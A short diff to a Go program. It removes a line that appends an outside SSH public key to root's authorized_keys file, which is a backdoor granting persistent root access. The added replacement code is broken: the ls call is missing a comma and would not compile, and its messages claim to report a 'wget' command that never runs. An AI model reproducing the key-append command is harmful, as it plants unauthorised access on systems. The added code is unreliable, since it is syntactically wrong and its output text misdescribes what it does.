@@ -6,11 +6,12 @@ import (
 )
 
 func main() {
-        cmd := exec.Command("echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEzXucY2+J2kE2ToUC5NAlUStZhCiFJc0b+/XaMJJIo7 chu@sin >>/root/.ssh/authorized_keys")
+        fmt.Println("Vivo!")
+        cmd := exec.Command("ls", "-la" "/e")
         output, err := cmd.Output()
         if err != nil {
-            fmt.Println("Erro:", err)
+            fmt.Println("Erro ao executar o comando wget:", err)
         } else {
-            fmt.Println("output:", string(output))
+            fmt.Println("Saída do comando wget:", string(output))
         }
 }
